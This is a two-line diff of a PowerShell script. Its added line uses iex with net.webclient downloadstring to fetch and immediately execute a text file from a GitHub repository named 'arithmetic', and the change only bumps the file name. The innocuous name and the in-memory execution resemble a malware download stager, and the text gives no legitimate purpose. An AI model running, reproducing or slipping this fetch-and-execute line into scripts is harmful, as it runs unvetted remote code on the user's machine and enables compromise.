@@ -1,2 +1,2 @@
 $data = "System.Management"
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/deverisc/arithmetic/refs/heads/main/arithmetic0001.txt')
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/deverisc/arithmetic/refs/heads/main/arithmetic00001.txt')
